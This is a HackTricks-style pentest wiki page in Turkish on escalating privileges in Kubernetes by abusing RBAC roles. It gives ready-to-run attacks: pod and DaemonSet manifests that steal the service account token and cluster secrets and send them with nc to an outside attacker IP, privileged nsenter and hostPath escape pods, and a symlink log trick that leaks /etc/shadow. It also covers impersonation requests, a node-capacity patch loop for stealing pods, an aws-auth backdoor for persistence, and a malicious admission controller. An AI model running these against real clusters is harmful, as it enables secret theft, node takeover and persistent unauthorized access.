# Kubernetes'te Roller/ClusterRoller'ları Kötüye Kullanma

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

Potansiyel olarak tehlikeli Roller ve ClusterRoles yapılandırmalarını burada bulabilirsiniz.\
`kubectl api-resources` komutu ile desteklenen tüm kaynaklara erişebilirsiniz.

## **Ayrıcalık Yükseltme**

Kubernetes'te **farklı ayrıcalıklara sahip bir başka prensibe erişim** elde etme sanatı olarak atıfta bulunulan **4 temel teknikle ayrıcalıkları yükseltmek** mümkündür:

* Kubernetes kümesi içinde veya harici bulutlara **daha iyi ayrıcalıklara sahip diğer kullanıcı/gruplar/SA'ları taklit edebilme**
* Daha iyi ayrıcalıklara sahip SA'ları **bulabileceğiniz veya ekleyebileceğiniz podlar oluşturabilme/patchleyebilme/exec edebilme**
* SA'ların tokenlarının saklandığı gizli bilgileri **okuyabilme**
* Bir konteynerden bir düğüme **kaçabilme**, bu sayede düğümde çalışan konteynerlerin tüm gizli bilgilerini, düğümün kimlik bilgilerini ve bulunduğu bulutta düğümün izinlerini (varsa) çalabilirsiniz
* Bir podda **port-forward çalıştırabilme** yeteneği, bu sayede o pod içinde ilginç kaynaklara erişebilme olasılığınız olabilir.

### Herhangi Bir Kaynağa veya Fiile Erişim (Yıldız İfadesi)

**Yıldız (\*) herhangi bir kaynağa herhangi bir fiil üzerinde izin verir**. Yöneticiler tarafından kullanılır. Bir ClusterRole içinde bu, saldırganın kümedeki herhangi bir alan adını kötüye kullanabileceği anlamına gelir.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Belirli bir fiil ile Herhangi Bir Kaynağa Erişim

RBAC'de, belirli izinler önemli riskler oluşturur:

1. **`create`:** Herhangi bir küme kaynağını oluşturma yetkisi verir, ayrıcalık yükselmesine neden olabilir.
2. **`list`:** Tüm kaynakları listeleme izni verir, hassas verilerin sızmasına neden olabilir.
3. **`get`:** Hizmet hesaplarından gizli bilgilere erişimi sağlar, bir güvenlik tehdidi oluşturabilir.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Oluştur - Token Çalma

Bir saldırgan, bir pod oluşturma izinlerine sahipse, bir ayrıcalıklı Hizmet Hesabını pod'a ekleyebilir ve token'ı çalarak Hizmet Hesabını taklit edebilir. Bu şekilde ayrıcalıkları yükseltebilir.

Saldırganın `bootstrap-signer` hizmet hesabının token'ını çalacak ve saldırgana gönderecek bir pod örneği:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Oluşturma ve Kaçış

Aşağıdaki, bir konteynerin sahip olabileceği tüm ayrıcalıkları gösterir:

- **Ayrıcalıklı erişim** (korumaları devre dışı bırakma ve yeteneklerin ayarlanması)
- **hostIPC ve hostPid ad alanlarını devre dışı bırakma** ayrıcalıkları yükseltmeye yardımcı olabilir
- **hostNetwork ad alanını devre dışı bırakma**, düğümlerin bulut ayrıcalıklarını çalmak ve ağlara daha iyi erişim sağlamak için erişim sağlar
- **Konteyner içinde ana bilgisayarı bağlama**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Aşağıdaki komutla pod oluşturun:
```bash
kubectl --token $token create -f mount_root.yaml
```
Bir tweet'ten bir satır ve bazı eklemeler:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Şimdi düğüme kaçış yapabilirsiniz, sonrasında sızma sonrası teknikleri kontrol edin:

#### Gizlilik

Muhtemelen daha **gizli** olmak istersiniz, aşağıdaki sayfalarda, önceki şablonlarda belirtilen ayrıcalıkların yalnızca bazılarını etkinleştirerek oluşturulan bir pod'a erişebileceğiniz şeyleri görebilirsiniz:

- **Ayrıcalıklı + hostPID**
- **Yalnızca ayrıcalıklı**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Önceki ayrıcalıklı pod yapılandırmalarını nasıl oluşturabileceğinizi/istismar edebileceğinizi_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _adresinde bulabilirsiniz._

### Pod Oluştur - Buluta Geçiş

Bir **pod** (ve isteğe bağlı olarak bir **hizmet hesabı**) **oluşturabilirseniz**, bir **pod'a veya hizmet hesabına bulut rolleri atayarak** ve ardından erişerek **bulut ortamında ayrıcalıklar elde edebilirsiniz**.\
Dahası, **ana ağ ad alanına sahip bir pod oluşturabilirseniz**, **düğüm** örneğinin **IAM** rolünü **çalabilirsiniz**.

Daha fazla bilgi için kontrol edin:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Dağıtım, Daemonset, Statefulset, Replicationcontroller, Replicaset, İşler ve Zamanlanmış İşler Oluştur/Patchle**

Bu izinleri **kullanarak yeni bir pod oluşturmak** ve önceki örnekte olduğu gibi ayrıcalıklar **elde etmek mümkündür**.

Aşağıdaki yaml, **bir daemonset oluşturur ve pod içindeki SA'nın belirteçini dışa aktarır**:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Podlar Exec**

**`pods/exec`**, bir Kubernetes kaynağıdır ve bir pod içinde bir kabukta komut çalıştırmak için kullanılır. Bu, **konteynerler içinde komut çalıştırmaya veya bir kabuğa girmeye olanak tanır**.

Bu nedenle, bir podun içine girip SA'nın belirteci çalınabilir veya ayrıcalıklı bir poda girebilir, düğüme kaçabilir ve düğümdeki tüm podların belgelerini çalabilir ve düğümü (kötüye) kullanabilirsiniz:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Bu izin, **belirtilen pod içinde çalışan uygulamaları hata ayıklamak için kolayca erişilebilir kılmak** amacıyla bir yerel bağlantı noktasını belirtilen pod içindeki bir bağlantı noktasına yönlendirmeye izin verir, ancak bir saldırgan bu izni kullanarak bir pod içinde ilginç (örneğin DB'ler) veya savunmasız uygulamalara (web?) erişebilir:
```
kubectl port-forward pod/mypod 5000:5000
```
### Ana Bilgisayar Yazılabilir /var/log/ Kaçışı

[**Bu araştırmada belirtildiği gibi**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), eğer **ana bilgisayarda `/var/log/` dizinine bağlanmış** bir pod'a erişebilir veya oluşturabilirseniz, **konteynerden kaçabilirsiniz**.\
Bu temelde, **Kube-API'nin bir konteynerin log'larını almayı denediğinde** ( `kubectl logs <pod>` kullanarak), **Kubelet** servisinin `/logs/` uç noktasını kullanarak pod'un `0.log` dosyasını istediğini belirtir.\
Kubelet servisi, konteynerin `/var/log` dosya sistemi **sunan** `/logs/` uç noktasını açığa çıkarır.

Bu nedenle, bir saldırganın **konteynerin /var/log/ klasörüne yazma erişimi** varsa, bu davranışları 2 şekilde kötüye kullanabilir:

* Genellikle `/var/logs/pods/namespace_pod_uid/container/0.log` konumunda bulunan kendi konteynerinin `0.log` dosyasını **örneğin `/etc/shadow`'a işaret eden bir sembolik bağ yaparak** değiştirir. Ardından, ana bilgisayarın shadow dosyasını dışa aktarabilirsiniz:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Eğer saldırganın **`nodes/log`'u okuma izinlerine sahip** herhangi bir anahtarı kontrol ediyorsa, sadece `/host-mounted/var/log/sym` içinde bir **sembolik bağ oluşturabilir** ve **`https://<gateway>:10250/logs/sym/` adresine eriştiğinde ana dizini listeler** (sembolik bağı değiştirmek dosyalara erişim sağlayabilir).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Bir laboratuvar ve otomatik saldırı** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### readOnly korumasını atlatma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Eğer şanslıysanız ve yüksek ayrıcalıklı yetenek `CAP_SYS_ADMIN` mevcutsa, sadece klasörü rw olarak yeniden bağlayabilirsiniz:
```bash
mount -o rw,remount /hostlogs/
```
#### hostPath readOnly korumasını atlatma <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**bu araştırmada**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) belirtildiği gibi korumayı atlatmak mümkündür:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Bu, öncekiler gibi kaçışları önlemek için bir hostPath bağlama yerine bir PersistentVolume ve bir PersistentVolumeClaim kullanarak bir ana klasörü konteynıra yazılabilir erişimle bağlamak için tasarlanmıştı:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Ayrıcalıklı hesapları taklit etme**

Bir [**kullanıcı taklidi**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) ayrıcalığı ile, bir saldırgan ayrıcalıklı bir hesabı taklit edebilir.

Bir kullanıcıyı taklit etmek için `kubectl` komutunda `--as=<kullanıcıadı>` parametresini kullanın veya bir grup taklit etmek için `--as-group=<grup>` kullanın:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ya da REST API'sini kullanın:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Sırları Listeleme

**Sırları listeleme izni, bir saldırganın aslında sırları okumasına izin verebilir** REST API uç noktasına erişerek:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Bir sırrı okuma - belirteç kimliklerini kaba kuvvet saldırısıyla deneme

Okuma izinlerine sahip bir saldırganın sırrı kullanabilmesi için tam adı gerekmektedir, daha geniş _**sırları listeleme**_ ayrıcalığından farklı olarak, hala zayıflıklar bulunmaktadır. Sistemdeki varsayılan hizmet hesapları numaralandırılabilir, her biri bir sırla ilişkilendirilmiştir. Bu sırların bir ad yapısı vardır: statik bir önek ve ardından rastgele beş karakterlik alfasayısal bir belirteç (belirli karakterleri hariç tutarak) [kaynak koduna](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83) göre.

Belirteç, tam alfasayısal aralık yerine sınırlı 27 karakterlik bir kümeden (`bcdfghjklmnpqrstvwxz2456789`) oluşturulur. Bu kısıtlama toplam olası kombinasyonu 14,348,907'ye (27^5) düşürür. Sonuç olarak, bir saldırgan muhtemelen birkaç saat içinde belirteci çıkarmak için kaba kuvvet saldırısı gerçekleştirebilir ve hassas hizmet hesaplarına erişerek ayrıcalık yükseltmesine yol açabilir.

### Sertifika İmzalama İstekleri

Eğer `certificatesigningrequests` kaynağında **`create`** fiillerine sahipseniz (veya en azından `certificatesigningrequests/nodeClient` içinde), **yeni bir düğümün** CeSR'sini **oluşturabilirsiniz**.

[Belgelendirmeye göre bu istekleri otomatik olarak onaylamak mümkündür](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), bu durumda **ekstra izinlere ihtiyacınız yoktur**. Aksi takdirde, isteği onaylayabilmek için `certificatesigningrequests/approval` içinde güncelleme yapmanız ve `signers` içinde `<signerNameDomain>/<signerNamePath>` veya `<signerNameDomain>/*` ile onaylamak gerekecektir.

Tüm gerekli izinlere sahip bir rol **örneği** şu şekildedir:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Yani, yeni düğüm CSR onaylandıktan sonra, düğümlerin özel izinlerini **kötüye kullanarak** **sırları çalabilir** ve **yetkileri yükseltebilirsiniz**.

[**Bu yazıda**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) ve [**bu yazıda**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) GKE K8s TLS Bootstrap yapılandırması **otomatik imzalama** ile yapılandırılmış ve yeni bir K8s Düğümünün kimlik bilgilerini oluşturmak için kötüye kullanılmış ve ardından bu kimlik bilgilerini çalarak yetkileri yükseltmek için kötüye kullanılmıştır. Eğer **söz konusu izinlere sahipseniz aynı şeyi yapabilirsiniz**. İlk örneğin, yeni bir düğümün içindeki sırlara erişmesini engelleyen hatayı atlamasının nedeni, bir **düğümün yalnızca üzerine bağlanmış konteynerlerin sırlarına erişebilmesidir.**

Bunu atlatmanın yolu, sadece **ilginç sırların bulunduğu konteynerin bağlı olduğu düğüm adı için bir düğüm kimlik bilgisi oluşturmaktır** (ancak bunu nasıl yapılacağını ilk yazıda kontrol edin):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

AWS (Amazon Web Services) küme sistem ad alanında **`configmaps`**'leri değiştirebilen ilkelere (AWS içinde olmalı) **aws-auth** configmap'i üzerine yazarak küme yönetici ayrıcalıklarını elde edebilir.\
Gerekli fiiller **`update`** ve **`patch`**'dir, veya configmap oluşturulmadıysa **`create`** kullanılabilir:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**Başka hesaplardan kullanıcılara erişim vermek için** **`aws-auth`**'ı **kalıcılık** için kullanabilirsiniz.

Ancak `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **farklı bir hesaptan çalışmaz**. Ancak aslında `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` çalışır, eğer sadece isim yerine kümenin ARN'sini koyarsanız.\
`kubectl`'yi çalıştırmak için, sadece **kurbanın kubeconfig'ini yapılandırdığınızdan** ve aws exec argümanlarına `--profile other_account_role` eklediğinizden emin olun, böylece kubectl diğer hesap profili kullanarak belirteci alacak ve AWS ile iletişim kuracaktır.
{% endhint %}

### GKE'de Yükselme

**GCP prensiplerine K8s izinleri atamanın 2 yolu** vardır. Her iki durumda da prensip, küme erişimine erişim sağlamak için **`container.clusters.get`** iznine sahip olmalıdır veya **kendi kubectl yapılandırma dosyanızı oluşturmanız** gerekecektir (bir sonraki bağlantıyı takip edin).

{% hint style="warning" %}
K8s api uç noktasıyla iletişim kurulurken, **GCP kimlik doğrulama belirteci gönderilecektir**. Ardından, GCP, K8s api uç noktası aracılığıyla önce **prensibin** (e-posta ile) **küme içinde herhangi bir erişime sahip olup olmadığını** kontrol edecek, ardından **GCP IAM aracılığıyla herhangi bir erişime sahip olup olmadığını** kontrol edecektir.\
Eğer **bunlardan herhangi biri** doğruysa, yanıt verilecektir. Eğer **doğru değilse**, GCP IAM aracılığıyla izin verilmesi gerektiğini belirten bir hata alınacaktır.
{% endhint %}

Ardından, ilk yöntem **GCP IAM** kullanmaktır, K8s izinleri **eşdeğer GCP IAM izinlerine** sahiptir ve eğer prensip bunlara sahipse, bunları kullanabilir.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

İkinci yöntem, **kullanıcıyı e-posta** (GCP hizmet hesapları dahil) ile tanımlayarak **küme içinde K8s izinleri atamaktır**.

### serviceaccounts token oluşturma

**TokenRequests** (`serviceaccounts/token`) oluşturabilen prensipler K8s api uç noktasıyla iletişim kurduğunda SAs (bilgi [**burada**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

**`pods/ephemeralcontainers`**'ı **`güncelleme`** veya **`yama`** yapabilen prensipler, bir **poddan diğer podlarda kod yürütebilir** ve bir ayrıcalıklı securityContext ile bir geçici konteyner ekleyerek kendi düğümüne **kaçabilir**.

### ValidatingWebhookConfigurations veya MutatingWebhookConfigurations

`validatingwebhookconfigurations` veya `mutatingwebhookconfigurations` üzerinde `oluşturma`, `güncelleme` veya `yama` fiillerine sahip prensipler, ayrıcalıkları **yükseltmek** için bir **webhook yapılandırmasından** birini **oluşturabilir**.

[`mutatingwebhookconfigurations` örneği için bu bölüme bakın](./#malicious-admission-controller).

### Yükseltme

Bir sonraki bölümde okuyabileceğiniz gibi: [**Dahili Ayrıcalıklı Yükseltme Önleme**](./#built-in-privileged-escalation-prevention), bir prensip, kendisine bu yeni izinleri vermeden **rolleri veya clusterrolleri güncelleyemez veya oluşturamaz**. Ancak **`roller`** veya **`clusterroller`** üzerinde **`yükseltme` fiiline sahipse**, o zaman yeni rolleri, clusterrolleri mevcut izinlerinden daha iyi izinlerle oluşturabilir/güncelleştirebilir.

### Düğümler proxy

**`nodes/proxy`** alt kaynağına erişimi olan prensipler, Kubelet API'si aracılığıyla **poddaki kodu yürütebilir** (bilgi [**burada**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Kubelet kimlik doğrulaması hakkında daha fazla bilgi için bu sayfaya bakın:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Yetkili bir şekilde Kubelet API'ye konuşarak [**RCE almanın bir örneğine buradan ulaşabilirsiniz**](../pentesting-kubernetes-services/#kubelet-rce).

### Podları silme + planlanamayan düğümler

**Podları silme** yetkisine sahip prensipler (`pods` kaynağı üzerinde `silme` fiili), veya **podları tahliye etme** yetkisine sahip prensipler (`pods/eviction` kaynağı üzerinde `oluşturma` fiili), veya **pod durumunu değiştirme** yetkisine sahip olanlar (`pods/status` erişimi) ve **diğer düğümleri planlanamaz hale getirebilen** ( `nodes/status` erişimi) veya **düğümleri silebilen** (`nodes` kaynağı üzerinde `silme` fiili) ve bir pod üzerinde kontrolü varsa, **diğer düğümlerden podları çalabilir** böylece bu podlar **kompromize edilmiş düğümde çalıştırılır** ve saldırgan bu podlardan **belirteçleri çalabilir**.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Hizmet durumu (CVE-2020-8554)

**`services/status`**'ı **değiştirebilen** yetkililer, `status.loadBalancer.ingress.ip` alanını ayarlayarak **düzeltilememiş CVE-2020-8554**'ü istismar edebilir ve **clus**ter'a karşı **MiTM saldırıları başlatabilir**. CVE-2020-8554 için çoğu önlem, yalnızca ExternalIP hizmetlerini önler ([**bu**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego) bağlantıya göre).

### Düğümler ve Pod'ların durumu

`nodes/status` veya `pods/status` üzerinde **`güncelleme`** veya **`yama`** izinlerine sahip olan yetkililer, zamanlama kısıtlamalarını etkilemek için etiketleri değiştirebilir.

## Yerleşik Ayrıcalık Yükseltme Önleme

Kubernetes'in [yerleşik bir mekanizması](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) ayrıcalık yükseltmeyi önler.

Bu sistem, **kullanıcıların rolleri veya rol bağlantılarını değiştirerek ayrıcalıklarını yükseltememesini sağlar**. Bu kuralın uygulanması API seviyesinde gerçekleşir ve RBAC yetkilendiricisi etkisiz olsa bile bir koruma sağlar.

Kural, bir **kullanıcının yalnızca bir rol oluşturabileceğini veya güncelleştirebileceğini belirtir** eğer rolün içerdiği tüm izinlere sahipse. Dahası, kullanıcının mevcut izinlerinin kapsamı, oluşturmayı veya değiştirmeyi denediği rolün kapsamıyla uyumlu olmalıdır: ya ClusterRoles için küresel düzeyde ya da Roller için aynı ad alanına (veya küresel düzeyde) sınırlı olmalıdır.

{% hint style="warning" %}
Önceki kurala bir istisna vardır. Eğer bir yetkili **`roller`** veya **`clusterroller`** üzerinde **`yükselt`** fiiline sahipse, rollerin ve clusterrollerin ayrıcalıklarını artırabilir, hatta kendisinde izin olmasa bile.
{% endhint %}

### **RolBağlantıları/ClusterRoleBağlantıları Al & Yama**

{% hint style="danger" %}
**Görünüşe göre bu teknik önceden işe yarıyordu, ancak testlerime göre artık önceki bölümde açıklandığı nedenle çalışmıyor. Kendinize veya farklı bir SA'ya bazı ayrıcalıklar vermek için bir rol bağlantısı oluşturamazsınız/değiştiremezsiniz eğer zaten izniniz yoksa.**
{% endhint %}

RolBağlantıları oluşturma ayrıcalığı, bir kullanıcının **rolleri bir hizmet hesabına bağlamasına** olanak tanır. Bu ayrıcalık, **kullanıcının bir tehlikeli hizmet hesabına yönetici ayrıcalıklarını bağlamasına izin verdiği için ayrıcalık yükseltmeye yol açabilir.**

## Diğer Saldırılar

### Yan araç proxy uygulaması

Varsayılan olarak, pod'lar arasındaki iletişimde şifreleme yoktur. Karşılıklı kimlik doğrulama, iki yönlü, poddan poda.

#### Yan araç proxy uygulaması oluşturma <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

.yaml dosyanızı oluşturun.
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Düzenleyin .yaml ve yorum satırlarını ekleyin:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Proxy'nin günlüklerini görüntüle:
```bash
kubectl logs app -C proxy
```
Daha fazla bilgi için: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Kötü Niyetli Kabul Denetleyicisi

Bir kabul denetleyicisi, nesnenin kalıcılığından önce Kubernetes API sunucusuna yapılan istekleri **onaylanmış ve yetkilendirilmiş** olduktan sonra **engeller**.

Bir saldırgan, bir Mutasyon Kabul Denetleyicisi **enjekte etmeyi başarırsa**, zaten doğrulanmış istekleri **değiştirebilir**. Bu, potansiyel olarak ayrıcalık yükseltme ve daha yaygın olarak kümede kalıcı olma yeteneği sağlar.

**Örnek** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Durumunu kontrol etmek için hazır olup olmadığını kontrol edin:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Daha sonra yeni bir pod dağıt:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Eğer `ErrImagePull` hatasını görebiliyorsanız, görüntü adını aşağıdaki sorgulardan biriyle kontrol edin:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Yukarıdaki görüntüde görebileceğiniz gibi, `nginx` görüntüsünü çalıştırmayı denedik ancak sonunda yürütülen görüntü `rewanthtammana/malicious-image` oldu. Şimdi ne oldu!!?

